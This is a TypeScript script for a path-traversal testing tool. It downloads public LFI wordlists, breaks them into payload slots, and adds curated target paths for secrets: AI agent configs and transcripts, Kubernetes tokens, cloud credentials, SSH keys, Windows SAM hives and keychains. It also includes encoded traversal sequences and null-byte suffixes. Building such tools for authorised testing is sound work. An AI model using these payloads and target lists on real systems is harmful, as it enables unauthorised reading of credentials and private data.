#!/usr/bin/env bun
/**
 * Harvest public LFI / path-traversal wordlists into pt's slot files.
 *
 *   bun run scripts/harvest-wordlists.ts [--sources <dir>] [--out <dir>]
 *
 * Downloads each source (cached in `--sources`, default `.cache/wordlists`),
 * decomposes every entry into the `prefix + traversal x repeat + target + suffix`
 * slots, and writes deduplicated template files with a source header.
 *
 * The decomposer lives in `src/core/payloads.ts` and checks itself by rebuilding
 * every candidate through the REAL `assemble`, so nothing lands in a slot file
 * that pt would not reproduce byte for byte.
 *
 * ## The layout it writes
 *
 * Not one flat corpus: FIVE folders, one per stack dimension, because the tool's
 * premise is that you recon the target's stack first and then assemble a
 * wordlist that matches it.
 *
 *   templates/windows/   Win32 paths, registry hives, IIS, UNC, `\` primitives
 *   templates/macos/     /System, /Library, /Users, keychains, launchd, Homebrew
 *   templates/linux/     /etc, /proc, /var/log, shells, SSH, POSIX primitives
 *   templates/language/  one file per runtime: PHP, Java, .NET, Python, Node, ...
 *   templates/devops/    nginx, tomcat, k8s, docker, terraform, CI/CD, cloud, AI
 *
 * `scripts/categorize.ts` holds the classifier and the two rules it applies.
 * Each folder gets only the slot dimensions that genuinely differ for it: every
 * folder has a `target.txt` (`language/` has one per runtime), but only
 * `windows/` and `linux/` have a `traversal.txt`, because separator identity is
 * the only thing traversal primitives differ in.
 *
 * Alongside them, at the `templates/` root, are the small SIZING files that
 * `pt-full.yml` pairs the big ones with -- `target-core`, `target-hot`,
 * `target-encoded`, `target-padding`, `traversal-core`, `traversal-min`,
 * `empty` -- because they are cross-category by construction.
 *
 * `pt --generate-basic-config` scaffolds the SAME paths with small hand-written
 * seeds, so point it at a fresh directory rather than at this repo. If you do
 * clobber the harvest, `bun run scripts/harvest-wordlists.ts` rebuilds it from
 * `.cache/wordlists/` without touching the network. (Before the category split
 * the two were kept apart by a `-full` suffix on every harvested file. The folder
 * names now carry that distinction for `pt-full.yml`'s small sizing files, which
 * still live at the `templates/` root under their own names, and the harvest is
 * one cached command, so a suffix on all 17 files is no longer worth the noise.)
 *
 * Three outcomes per entry:
 *   - decomposed into the four slots;
 *   - routed VERBATIM to `<category>/raw.txt`, because no `traversal x depth`
 *     produces it (the traversal steps have no period -- see `smallestPeriod`);
 *   - discarded, because the line is corrupt or carries an unresolvable
 *     placeholder.
 * All three are counted and printed.
 */
import * as fs from "node:fs/promises"
import * as path from "node:path"
import {
  classesOf,
  decompose,
  isCommentLine,
  toLiteral,
  type PayloadClass,
  type Rejection
} from "../src/core/index.ts"
import {
  classifyTarget,
  separatorFamily,
  type Category,
  type Language
} from "./categorize.ts"

// ---------------------------------------------------------------------------
// Sources
// ---------------------------------------------------------------------------

interface Source {
  readonly file: string
  readonly url: string
  readonly note: string
}

const SECLISTS = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI"
const PATT = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master"

const SOURCES: ReadonlyArray<Source> = [
  { file: "LFI-Jhaddix.txt", url: `${SECLISTS}/LFI-Jhaddix.txt`, note: "SecLists" },
  {
    file: "LFI-LFISuite-pathtotest-huge.txt",
    url: `${SECLISTS}/LFI-LFISuite-pathtotest-huge.txt`,
    note: "SecLists"
  },
  {
    file: "LFI-LFISuite-pathtotest.txt",
    url: `${SECLISTS}/LFI-LFISuite-pathtotest.txt`,
    note: "SecLists"
  },
  {
    file: "LFI-linux-and-windows_by-1N3@CrowdShield.txt",
    url: `${SECLISTS}/LFI-linux-and-windows_by-1N3@CrowdShield.txt`,
    note: "SecLists"
  },
  {
    file: "LFI-etc-files-of-all-linux-packages.txt",
    url: `${SECLISTS}/Linux/LFI-etc-files-of-all-linux-packages.txt`,
    note: "SecLists/Linux"
  },
  {
    file: "LFI-gracefulsecurity-linux.txt",
    url: `${SECLISTS}/Linux/LFI-gracefulsecurity-linux.txt`,
    note: "SecLists/Linux"
  },
  {
    file: "Windows-LFI-Payloads_by-adeadfed.txt",
    url: `${SECLISTS}/Windows/Windows-LFI-Payloads_by-adeadfed.txt`,
    note: "SecLists/Windows"
  },
  {
    file: "Windows-Paths.txt",
    url: `${SECLISTS}/Windows/Windows-Paths.txt`,
    note: "SecLists/Windows"
  },
  // PayloadsAllTheThings: the only other actively maintained corpus that adds
  // genuinely new material -- BSD and macOS targets, and the exotic traversal
  // encodings (%uXXXX, %%35%63) that SecLists has none of.
  {
    file: "patt-Linux-files.txt",
    url: `${PATT}/File%20Inclusion/Intruders/Linux-files.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-Windows-files.txt",
    url: `${PATT}/File%20Inclusion/Intruders/Windows-files.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-BSD-files.txt",
    url: `${PATT}/File%20Inclusion/Intruders/BSD-files.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-Mac-files.txt",
    url: `${PATT}/File%20Inclusion/Intruders/Mac-files.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-Web-files.txt",
    url: `${PATT}/File%20Inclusion/Intruders/Web-files.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-LFI-FD-check.txt",
    url: `${PATT}/File%20Inclusion/Intruders/LFI-FD-check.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-LFI-WindowsFileCheck.txt",
    url: `${PATT}/File%20Inclusion/Intruders/LFI-WindowsFileCheck.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-List_Of_File_To_Include.txt",
    url: `${PATT}/File%20Inclusion/Intruders/List_Of_File_To_Include.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-Traversal.txt",
    url: `${PATT}/File%20Inclusion/Intruders/Traversal.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-directory_traversal.txt",
    url: `${PATT}/Directory%20Traversal/Intruder/directory_traversal.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-deep_traversal.txt",
    url: `${PATT}/Directory%20Traversal/Intruder/deep_traversal.txt`,
    note: "PayloadsAllTheThings"
  },
  {
    file: "patt-traversals-8-deep-exotic-encoding.txt",
    url: `${PATT}/Directory%20Traversal/Intruder/traversals-8-deep-exotic-encoding.txt`,
    note: "PayloadsAllTheThings"
  }
]

// ---------------------------------------------------------------------------
// Curated additions: targets no reviewed list contains
// ---------------------------------------------------------------------------

/**
 * A curated section names its own destination folder.
 *
 * Harvested entries are classified MECHANICALLY by `classifyTarget`, because
 * 16,000 lines cannot be read by hand and a measurement beats an opinion. A
 * curated section is the opposite case: somebody grouped these lines by
 * technology on purpose, and that grouping is the thing worth keeping, so the
 * section says where it goes and travels into exactly one file with its header
 * intact. Splitting one across folders by machine would destroy the only thing
 * it had.
 */
interface CuratedSection {
  readonly title: string
  readonly category: Category
  /** Required when `category` is `"language"`. */
  readonly language?: Language
  readonly entries: ReadonlyArray<string>
}

/**
 * `~` is expanded, not emitted.
 *
 * The reference lists do use a literal `~/` (110 distinct lines across four of
 * them) and those survive verbatim through the harvest, but a traversal cannot
 * rely on shell expansion. Every curated home-directory path therefore ships as
 * both `/root/...` and `/home/user/...`, which is how the lists themselves
 * handle per-user paths.
 */
const HOME_ROOTS = ["/root", "/home/user"] as const

const homes = (...tails: ReadonlyArray<string>): Array<string> =>
  tails.flatMap((tail) => HOME_ROOTS.map((root) => `${root}/${tail}`))

/**
 * Curated sections, grouped so a whole technology can be trimmed out in one cut.
 *
 * Verified absent from the reference corpus: zero hits for claude, codex,
 * cursor, copilot, aider, ollama, huggingface, openai, kube, docker,
 * serviceaccount, terraform or ed25519 across all 930 lines of LFI-Jhaddix.txt,
 * and the same holds for the rest of the corpus.
 */
const CURATED: ReadonlyArray<CuratedSection> = [
  {
    title: "AI agent configuration (2025-2026 tooling; absent from every public list)",
    category: "devops",
    entries: [
      "/.mcp.json",
      "/.claude/settings.local.json",
      "/.claude/settings.json",
      ...homes(
        ".claude.json",
        ".claude/settings.json",
        ".config/claude/claude_desktop_config.json",
        ".codex/auth.json",
        ".codex/config.toml",
        ".config/github-copilot/apps.json",
        ".config/github-copilot/hosts.json",
        ".cursor/mcp.json",
        ".continue/config.json",
        ".aider.conf.yml",
        ".cache/huggingface/token",
        ".ollama/id_ed25519",
        ".ollama/models/manifests"
      )
    ]
  },
  {
    title: "AI agent transcripts and memory (whole conversations, often with secrets in them)",
    category: "devops",
    entries: [
      "/CLAUDE.md",
      "/AGENTS.md",
      "/GEMINI.md",
      "/.aider.chat.history.md",
      "/.aider.input.history",
      ...homes(".claude/memory", ".claude/history.jsonl", ".claude/projects")
    ]
  },
  {
    title: "RAG / vector stores (embedded source documents, recoverable verbatim)",
    category: "devops",
    entries: [
      "/chroma.sqlite3",
      "/chroma/chroma.sqlite3",
      "/index.faiss",
      "/index.pkl",
      "/docstore.json",
      "/storage/docstore.json"
    ]
  },
  {
    title: "Kubernetes: in-pod service account (present in EVERY pod; highest value)",
    category: "devops",
    entries: [
      "/run/secrets/kubernetes.io/serviceaccount/token",
      "/run/secrets/kubernetes.io/serviceaccount/ca.crt",
      "/run/secrets/kubernetes.io/serviceaccount/namespace",
      // /var/run is usually a symlink to /run, but a filter or allowlist
      // frequently knows only one of the two spellings.
      "/var/run/secrets/kubernetes.io/serviceaccount/token",
      "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
      "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
    ]
  },
  {
    title: "Kubernetes: cloud workload identity",
    category: "devops",
    entries: [
      "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
      "/var/run/secrets/azure/tokens/azure-identity-token"
    ]
  },
  {
    title: "Kubernetes: control plane and node",
    category: "devops",
    entries: [
      "/etc/kubernetes/admin.conf",
      "/etc/kubernetes/kubelet.conf",
      "/etc/kubernetes/controller-manager.conf",
      "/etc/kubernetes/scheduler.conf",
      "/etc/kubernetes/pki/ca.key",
      "/etc/kubernetes/pki/apiserver.key",
      "/etc/kubernetes/pki/etcd/ca.key",
      "/etc/kubernetes/pki/etcd/server.key",
      "/var/lib/kubelet/config.yaml",
      "/var/lib/kubelet/pki/kubelet-client-current.pem",
      ...homes(".kube/config")
    ]
  },
  {
    title: "Lightweight distros (kubeconfig lives nowhere near the usual place)",
    category: "devops",
    entries: [
      "/etc/rancher/k3s/k3s.yaml",
      "/var/lib/rancher/k3s/server/node-token",
      "/etc/rancher/rke2/rke2.yaml"
    ]
  },
  {
    title: "Docker / container runtime (readable files only; sockets yield nothing here)",
    category: "devops",
    entries: [
      "/.dockerenv",
      "/etc/docker/daemon.json",
      "/proc/self/cgroup",
      "/proc/1/cgroup",
      "/proc/self/mountinfo",
      // Swarm / compose mount secrets into /run/secrets under their own name.
      "/run/secrets/db_password",
      "/run/secrets/postgres_password",
      ...homes(".docker/config.json")
    ]
  },
  {
    title: "Cloud instance bootstrap (user-data routinely carries bootstrap credentials)",
    category: "devops",
    entries: [
      "/var/lib/cloud/instance/user-data.txt",
      "/var/lib/cloud/data/instance-id",
      "/etc/cloud/cloud.cfg"
    ]
  },
  {
    title: "Infrastructure as code (terraform state stores secrets in PLAINTEXT)",
    category: "devops",
    entries: [
      "/terraform.tfstate",
      "/terraform.tfstate.backup",
      "/.terraform/terraform.tfstate",
      "/terraform.tfvars"
    ]
  },
  {
    title: "CI / CD runners",
    category: "devops",
    entries: [
      "/etc/gitlab-runner/config.toml",
      "/var/lib/jenkins/secrets/initialAdminPassword",
      "/var/lib/jenkins/credentials.xml",
      "/home/runner/work/_temp/_github_workflow/event.json",
      ...homes(".config/gh/hosts.yml")
    ]
  },
  {
    title: "Cloud CLI credentials",
    category: "devops",
    entries: [
      "/etc/vault.d/vault.hcl",
      ...homes(
        ".aws/credentials",
        ".aws/config",
        ".config/gcloud/application_default_credentials.json",
        ".azure/azureProfile.json",
        ".azure/accessTokens.json",
        ".vault-token"
      )
    ]
  },
  {
    title: "Developer credentials the old lists predate (Ed25519 postdates id_rsa/id_dsa)",
    category: "devops",
    entries: [
      "/.env",
      "/.env.local",
      "/.env.production",
      "/.git/config",
      "/.git-credentials",
      "/.git/HEAD",
      ...homes(
        ".ssh/id_ed25519",
        ".ssh/id_ed25519.pub",
        ".npmrc",
        ".pypirc",
        ".netrc",
        ".gitconfig",
        ".git-credentials",
        ".config/hub"
      )
    ]
  },
  // -------------------------------------------------------------------------
  // Sections added when templates/ was split into the five stack categories.
  //
  // The reference corpus is lopsided by platform as well as by shape: it has 25
  // macOS paths, 2 Java paths and 6 Python paths against 5,900 Windows ones. A
  // `macos/` folder holding 25 lines, or a `language/target-java.txt` holding
  // two, would be a folder you cannot actually recon with. These sections make
  // each category usable; they are curated, they are labelled as curated, and
  // they are counted in the harvest report like everything else.
  // -------------------------------------------------------------------------
  {
    title: "macOS: system identity, launchd and keychains",
    category: "macos",
    entries: [
      "/System/Library/CoreServices/SystemVersion.plist",
      "/System/Library/LaunchDaemons/com.apple.loginwindow.plist",
      "/Library/LaunchDaemons",
      "/Library/LaunchAgents",
      "/Library/Preferences/com.apple.loginwindow.plist",
      "/Library/Preferences/SystemConfiguration/preferences.plist",
      "/Library/Keychains/System.keychain",
      "/Library/Keychains/System.keychain-db",
      "/private/var/db/dslocal/nodes/Default/users/root.plist",
      "/private/var/db/.AppleSetupDone",
      "/private/etc/master.passwd",
      "/private/etc/sudoers",
      "/private/etc/ssh/sshd_config",
      "/private/etc/apache2/httpd.conf",
      "/private/var/log/system.log",
      "/private/var/log/install.log",
      "/etc/master.passwd",
      "/etc/auto_master",
      "/etc/synthetic.conf",
      "/etc/kcpassword",
      "/.DS_Store"
    ]
  },
  {
    title: "macOS: per-user data under /Users (Finder drops .DS_Store everywhere)",
    category: "macos",
    entries: [
      "/Users/Shared/.DS_Store",
      "/Users/user/.DS_Store",
      "/Users/user/.zsh_history",
      "/Users/user/.bash_history",
      "/Users/user/.ssh/id_ed25519",
      "/Users/user/.aws/credentials",
      "/Users/user/Library/Keychains/login.keychain-db",
      "/Users/user/Library/Preferences/com.apple.finder.plist",
      "/Users/user/Library/Application Support/Google/Chrome/Default/Login Data",
      "/Users/user/Library/Containers/com.apple.mail/Data/Library/Mail"
    ]
  },
  {
    title: "macOS: Homebrew (a second, writable prefix the system one shadows)",
    category: "macos",
    entries: [
      "/opt/homebrew/etc/nginx/nginx.conf",
      "/opt/homebrew/etc/my.cnf",
      "/opt/homebrew/etc/php/8.3/php.ini",
      "/opt/homebrew/var/log/nginx/access.log",
      "/opt/homebrew/var/log/php-fpm.log",
      "/opt/homebrew/Library/Taps"
    ]
  },
  {
    title: "Java / JVM web application (the corpus has almost none of this)",
    category: "language",
    language: "java",
    entries: [
      "/WEB-INF/web.xml",
      "/WEB-INF/classes/application.properties",
      "/WEB-INF/classes/application.yml",
      "/WEB-INF/classes/hibernate.cfg.xml",
      "/WEB-INF/classes/log4j.properties",
      "/WEB-INF/classes/log4j2.xml",
      "/WEB-INF/classes/logback.xml",
      "/WEB-INF/classes/jdbc.properties",
      "/WEB-INF/classes/struts.xml",
      "/WEB-INF/lib",
      "/META-INF/MANIFEST.MF",
      "/META-INF/context.xml",
      "/WEB-INF/applicationContext.xml",
      "/WEB-INF/spring/applicationContext.xml",
      "/WEB-INF/faces-config.xml",
      "/WEB-INF/struts-config.xml",
      "/WEB-INF/weblogic.xml",
      "/WEB-INF/jboss-web.xml",
      "/.keystore",
      "/etc/ssl/certs/java/cacerts"
    ]
  },
  {
    title: "Python / Django / Flask",
    category: "language",
    language: "python",
    entries: [
      "/app/settings.py",
      "/app/wsgi.py",
      "/app/asgi.py",
      "/manage.py",
      "/requirements.txt",
      "/pyproject.toml",
      "/Pipfile",
      "/Pipfile.lock",
      "/instance/config.py",
      "/etc/uwsgi/uwsgi.ini",
      "/etc/gunicorn.conf.py",
      ...homes(".pythonstartup", ".config/pip/pip.conf")
    ]
  },
  {
    title: "Node / npm",
    category: "language",
    language: "node",
    entries: [
      "/package.json",
      "/package-lock.json",
      "/ecosystem.config.js",
      "/next.config.js",
      "/nuxt.config.js",
      "/node_modules/.package-lock.json",
      "/server.js",
      "/app.js",
      "/tsconfig.json"
    ]
  },
  {
    title: "Ruby / Rails",
    category: "language",
    language: "ruby",
    entries: [
      "/Gemfile",
      "/Gemfile.lock",
      "/config/database.yml",
      "/config/secrets.yml",
      "/config/master.key",
      "/config/credentials/production.key",
      "/config/puma.rb",
      "/config/routes.rb",
      ...homes(".gemrc")
    ]
  },
  {
    title: "PHP: application configuration the public lists do not reach",
    category: "language",
    language: "php",
    entries: [
      "/composer.json",
      "/composer.lock",
      "/vendor/autoload.php",
      "/wp-config.php",
      "/app/etc/env.php",
      "/config/parameters.yml",
      "/.htaccess",
      "/.htpasswd"
    ]
  },
  {
    title: "Windows: registry hives and IIS (readable copies, not the live files)",
    category: "windows",
    entries: [
      "C:\\Windows\\System32\\config\\SAM",
      "C:\\Windows\\System32\\config\\SYSTEM",
      "C:\\Windows\\System32\\config\\SECURITY",
      "C:\\Windows\\System32\\config\\SOFTWARE",
      "C:\\Windows\\System32\\config\\RegBack\\SAM",
      "C:\\Windows\\System32\\config\\RegBack\\SYSTEM",
      "C:\\Windows\\repair\\SAM",
      "C:\\Windows\\repair\\SYSTEM",
      "C:\\Windows\\NTDS\\NTDS.dit",
      "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
      "C:\\Windows\\System32\\inetsrv\\config\\administration.config",
      "C:\\inetpub\\wwwroot\\web.config",
      "C:\\inetpub\\logs\\LogFiles",
      "C:\\Windows\\Panther\\unattend.xml",
      "C:\\Windows\\Panther\\Unattended.xml",
      "C:\\Windows\\System32\\sysprep\\sysprep.xml",
      "C:\\Windows\\debug\\NetSetup.log",
      "C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials"
    ]
  },
  {
    title: "Infrastructure: served document roots and service configs",
    category: "devops",
    entries: [
      "/etc/nginx/nginx.conf",
      "/etc/nginx/sites-enabled/default",
      "/etc/nginx/conf.d/default.conf",
      "/etc/apache2/apache2.conf",
      "/etc/apache2/sites-enabled/000-default.conf",
      "/etc/httpd/conf/httpd.conf",
      "/etc/haproxy/haproxy.cfg",
      "/etc/traefik/traefik.yml",
      "/etc/caddy/Caddyfile",
      "/usr/local/tomcat/conf/server.xml",
      "/usr/local/tomcat/conf/tomcat-users.xml",
      "/opt/tomcat/conf/server.xml",
      "/etc/systemd/system/app.service",
      "/docker-compose.yml",
      "/compose.yaml",
      "/Dockerfile"
    ]
  }
]

/**
 * Seeds pt already ships in `src/seed.ts` that no reference list contains as a
 * decomposable prefix or suffix. Kept so `pt-full.yml` is a superset of the
 * scaffold rather than a divergent fork of it.
 */
const EXTRA_PREFIXES = ["///////"] as const

/**
 * Curated document roots, as `[value, file, section title]`.
 *
 * The corpus has exactly four real document roots (`/var/www/html/`,
 * `/var/www/images/`, `/cgi-bin/` and one `C:\WINDOWS\win.ini../` oddity), which
 * is not enough for `windows/prefix.txt` or `devops/prefix.txt` to be worth
 * opening. The prefix slot is where a document root goes, and a document root is
 * the single most recon-dependent line in a whole config -- it is the one thing
 * you cannot guess from the response.
 */
const CURATED_PREFIXES: ReadonlyArray<readonly [string, string, string]> = [
  ["C:\\inetpub\\wwwroot\\", "windows/prefix.txt", "IIS and Windows document roots"],
  ["C:\\xampp\\htdocs\\", "windows/prefix.txt", "IIS and Windows document roots"],
  ["C:\\wamp\\www\\", "windows/prefix.txt", "IIS and Windows document roots"],
  [
    "C:\\Program Files\\Apache Group\\Apache\\htdocs\\",
    "windows/prefix.txt",
    "IIS and Windows document roots"
  ],
  ["/usr/share/nginx/html/", "devops/prefix.txt", "Document roots a web or application server maps"],
  ["/var/www/", "devops/prefix.txt", "Document roots a web or application server maps"],
  // These two were EXTRA_PREFIXES, which land in linux/, while `/var/www/` just
  // above was curated into devops/ -- the same document root in two folders. A
  // docroot is server configuration wherever it happens to live on disk.
  ["/var/www/html/", "devops/prefix.txt", "Document roots a web or application server maps"],
  ["/var/www/images/", "devops/prefix.txt", "Document roots a web or application server maps"],
  ["/srv/http/", "devops/prefix.txt", "Document roots a web or application server maps"],
  ["/opt/tomcat/webapps/ROOT/", "devops/prefix.txt", "Document roots a web or application server maps"],
  ["/app/", "devops/prefix.txt", "Document roots a web or application server maps"],
  ["/usr/src/app/", "devops/prefix.txt", "Document roots a web or application server maps"]
]
const EXTRA_SUFFIXES = ["%00.png", "?.png", "#.png", ";.png", "%00.jpg", "%00.html"] as const

// ---------------------------------------------------------------------------
// Sizing files
// ---------------------------------------------------------------------------

/**
 * Why these exist at all.
 *
 * `target-full.txt` has 15,772 entries and `traversal-full.txt` has 185. A
 * strategy that cross-products them costs 2.9M payloads, and the reference
 * corpus does not ask for anything like that: 14,587 of its 14,608 distinct
 * targets appear ONLY as bare absolute paths, and the encoded classes between
 * them demand 23. So `pt-full.yml` pairs each big file with small ones, and the
 * split below is the measurement that justifies it rather than a guess.
 */

/** The traversals every target gets. Two spellings, two platforms. */
const TRAVERSAL_MIN = ["../", "..\\"] as const

/**
 * Enough traversal variety to cover the reference `plain`, `semicolon`,
 * `noise-slash` and `noise-dot` classes without touching the other 177
 * primitives.
 */
const TRAVERSAL_CORE = [
  "../",
  "..\\",
  "..%2f",
  "..%5c",
  "....//",
  "..;/",
  ".././",
  "..../"
] as const

/**
 * The files the strategy layer spells out in every encoding.
 *
 * Measured: the reference corpus pairs an ENCODED class with 23 distinct
 * targets, and they are all classics. The 2026-era entries are here because
 * they deserve the same encoding coverage even though no public list has
 * reached them yet.
 */
const TARGET_CORE = [
  "/etc/passwd",
  "/etc/shadow",
  "/etc/master.passwd",
  "/etc/group",
  "/etc/hosts",
  "/etc/my.cnf",
  "/etc/httpd/conf/httpd.conf",
  "/etc/.htpasswd",
  "/.htaccess",
  "/proc/self/environ",
  "/proc/self/cmdline",
  "/proc/version",
  "/var/log/auth.log",
  "/var/named",
  "/boot.ini",
  "/windows/win.ini",
  "/windows/system32/drivers/etc/hosts",
  "/winnt/win.ini",
  "C:\\boot.ini",
  "C:\\windows\\win.ini",
  "C:\\windows\\system32\\drivers\\etc\\hosts",
  "C:\\windows\\system32\\config\\SAM",
  "php://input",
  "/.env",
  "/.git/config",
  "/.git-credentials",
  "/.mcp.json",
  "/CLAUDE.md",
  "/AGENTS.md",
  "/run/secrets/kubernetes.io/serviceaccount/token",
  "/var/run/secrets/kubernetes.io/serviceaccount/token",
  "/etc/kubernetes/admin.conf",
  "/terraform.tfstate",
  "/.dockerenv",
  "/root/.kube/config",
  "/root/.aws/credentials",
  "/root/.ssh/id_ed25519",
  "/root/.claude.json",
  "/root/.codex/auth.json"
] as const

/**
 * Targets worth padding past a path-length limit.
 *
 * `padding:2048` multiplies the length of every payload it touches, so this list
 * stays tiny on purpose -- see the README's note on per-strategy overrides.
 */
const TARGET_PADDING = ["/etc/passwd", "/proc/self/environ", "/.env"] as const

/** Classes that mean "this target needs more than a bare absolute path". */
const BARE: ReadonlySet<PayloadClass> = new Set<PayloadClass>([
  "absolute-no-traversal",
  "backslash"
])

/**
 * Classes that mean "the reference corpus spells this target's separators in
 * some non-literal way", so the rewrite strategies have to reach its target.
 */
const RESPELLED: ReadonlySet<PayloadClass> = new Set<PayloadClass>([
  "partial-dots",
  "partial-sep",
  "full-url",
  "double-url",
  "triple-url",
  "overlong",
  "fullwidth",
  "percent-u",
  "nested-percent",
  "base64"
])

// ---------------------------------------------------------------------------
// Harvest
// ---------------------------------------------------------------------------

interface Tally {
  lines: number
  comments: number
  decomposed: number
  raw: number
  discarded: Record<string, number>
}

const emptyTally = (): Tally => ({
  lines: 0,
  comments: 0,
  decomposed: 0,
  raw: 0,
  discarded: {}
})

/** Insertion-ordered value -> contributing source files. */
type Bag = Map<string, Set<string>>

/**
 * Longest prefix kept.
 *
 * The lists contain 260-byte `AAAA…/` and `./././…` padding preludes, which are
 * a path-LENGTH attack rather than a path. `padding:N` is pt's stage for that and
 * it generates them from a single integer, so carrying them as literal prefix
 * lines would multiply every payload's length for no new coverage.
 */
const MAX_PREFIX_LENGTH = 48
const droppedLongPrefixes = new Set<string>()

const add = (bag: Bag, value: string, source: string): void => {
  if (value.length === 0) return
  const existing = bag.get(value)
  if (existing === undefined) bag.set(value, new Set([source]))
  else existing.add(source)
}

const download = async (source: Source, dir: string): Promise<string> => {
  const local = path.join(dir, source.file)
  try {
    return await fs.readFile(local, "utf8")
  } catch {
    process.stderr.write(`  fetching ${source.file} ...`)
    const response = await fetch(source.url)
    if (!response.ok) {
      throw new Error(`${source.url} -> HTTP ${response.status}`)
    }
    const text = await response.text()
    await fs.mkdir(dir, { recursive: true })
    await fs.writeFile(local, text, "utf8")
    process.stderr.write(` ${text.length} bytes\n`)
    return text
  }
}

const header = (
  what: string,
  count: number,
  sources: ReadonlyArray<string>,
  extra: ReadonlyArray<string> = []
): string =>
  [
    `# pt ${what} -- ${count} entries`,
    `#`,
    `# Generated by scripts/harvest-wordlists.ts. Do not hand-edit; re-run instead.`,
    `# Lines are trimmed and '# ' comments dropped by pt, so a trailing space or a`,
    `# lone '#' CANNOT be expressed here -- those come from strategies.`,
    `#`,
    `# Sources:`,
    ...sources.map((line) => `#   ${line}`),
    ...extra.map((line) => `# ${line}`),
    `#`,
    ``
  ].join("\n")

const main = async (): Promise<void> => {
  const argv = process.argv.slice(2)
  const flag = (name: string, fallback: string): string => {
    const at = argv.indexOf(`--${name}`)
    return at >= 0 && argv[at + 1] !== undefined ? argv[at + 1]! : fallback
  }
  const repoRoot = path.resolve(import.meta.dirname, "..")
  const sourceDir = path.resolve(repoRoot, flag("sources", ".cache/wordlists"))
  const outDir = path.resolve(repoRoot, flag("out", "templates"))

  const prefixes: Bag = new Map()
  const traversals: Bag = new Map()
  const targets: Bag = new Map()
  const suffixes: Bag = new Map()
  const hotTargets: Bag = new Map()
  const encodedTargets: Bag = new Map()
  const raws: Bag = new Map()
  const tallies = new Map<string, Tally>()
  /** target -> the primary classes it is seen with, for sizing target-hot. */
  const sourceLines: Array<{ readonly line: string; readonly file: string }> = []

  process.stderr.write(`pt harvest: ${SOURCES.length} sources -> ${outDir}\n`)

  for (const source of SOURCES) {
    const text = await download(source, sourceDir)
    const tally = emptyTally()
    tallies.set(source.file, tally)

    for (const rawLine of text.split(/\r?\n/)) {
      const line = rawLine.replace(/\r/g, "")
      if (line.trim().length === 0) continue
      tally.lines += 1
      if (isCommentLine(line.trim())) {
        tally.comments += 1
        continue
      }
      sourceLines.push({ line, file: source.file })

      const result = decompose(line)
      if (result.kind === "reject") {
        const key: Rejection = result.why
        tally.discarded[key] = (tally.discarded[key] ?? 0) + 1
        continue
      }
      if (result.kind === "raw") {
        tally.raw += 1
        add(raws, line.replace(/[ \t]+$/, ""), source.file)
        continue
      }
      const { prefix, traversal, target, suffix } = result.parts
      tally.decomposed += 1
      if (prefix.length > MAX_PREFIX_LENGTH) droppedLongPrefixes.add(prefix)
      else add(prefixes, prefix, source.file)
      add(traversals, traversal, source.file)
      add(suffixes, suffix.replace(/[ \t]+$/, ""), source.file)
      // A '{FILE}' placeholder is a traversal template, not a file to read.
      if (!target.includes("{FILE}")) {
        add(targets, target, source.file)
        const klasses = classesOf(line)
        // Does this entry ask for more than a bare absolute path? If so its
        // target has to reach the blocks that carry traversals and suffixes.
        if (klasses.some((klass) => !BARE.has(klass))) {
          add(hotTargets, target, source.file)
        }
        // Is some separator respelled? Then a rewrite strategy has to reach it.
        // The target is stored in its LITERAL spelling, because the strategy is
        // what supplies the encoding -- a target that already reads
        // '/etc%2fpasswd' would come out double-encoded.
        if (klasses.some((klass) => RESPELLED.has(klass))) {
          add(encodedTargets, toLiteral(target), source.file)
        }
      }
    }
  }

  // Curated additions: added to the bag so they are deduplicated against the
  // harvest, and routed to a folder by the SECTION rather than by the classifier
  // -- see the comment on CuratedSection.
  for (const section of CURATED) {
    for (const entry of section.entries) add(targets, entry, "curated")
  }
  for (const value of EXTRA_PREFIXES) add(prefixes, value, "pt seed (src/seed.ts)")
  for (const value of EXTRA_SUFFIXES) add(suffixes, value, "pt seed (src/seed.ts)")

  /** Harvested values only, excluding the curated block written separately. */
  const harvestedOnly = (bag: Bag): Array<string> =>
    [...bag.keys()].filter((key) => {
      const from = bag.get(key)!
      return !(from.size === 1 && from.has("curated"))
    })

  // ---------------------------------------------------------------------------
  // Split into the five stack categories
  // ---------------------------------------------------------------------------
  //
  // One output file is a list of SECTIONS. The first section has no title and
  // holds the mechanically classified harvest; after it come the curated
  // sections that landed in this file, each keeping the header it was written
  // with. Every value lands in exactly one file, so the five folders are a
  // partition of the corpus and not five overlapping views of it.

  interface Section {
    readonly title: string | undefined
    readonly values: Array<string>
  }

  interface OutFile {
    /** Path relative to `outDir`, e.g. `linux/target.txt`. */
    readonly file: string
    /** For the header's first line: "pt linux target dimension". */
    readonly what: string
    /** Prose for the header, explaining what this category is for. */
    readonly explain: ReadonlyArray<string>
    readonly sections: Array<Section>
    /** Source files that contributed at least one line here. */
    readonly sources: Set<string>
  }

  const outFiles = new Map<string, OutFile>()

  const fileAt = (
    file: string,
    what: string,
    explain: ReadonlyArray<string>
  ): OutFile => {
    const existing = outFiles.get(file)
    if (existing !== undefined) return existing
    const created: OutFile = { file, what, explain, sections: [], sources: new Set() }
    outFiles.set(file, created)
    return created
  }

  const put = (
    out: OutFile,
    title: string | undefined,
    value: string,
    sources: Iterable<string>
  ): void => {
    let section = out.sections.find((candidate) => candidate.title === title)
    if (section === undefined) {
      section = { title, values: [] }
      out.sections.push(section)
    }
    section.values.push(value)
    for (const source of sources) out.sources.add(source)
  }

  /** `linux/target.txt`, or `language/target-php.txt`. */
  const targetFile = (category: Category, language?: Language): string =>
    category === "language"
      ? `language/target-${language}.txt`
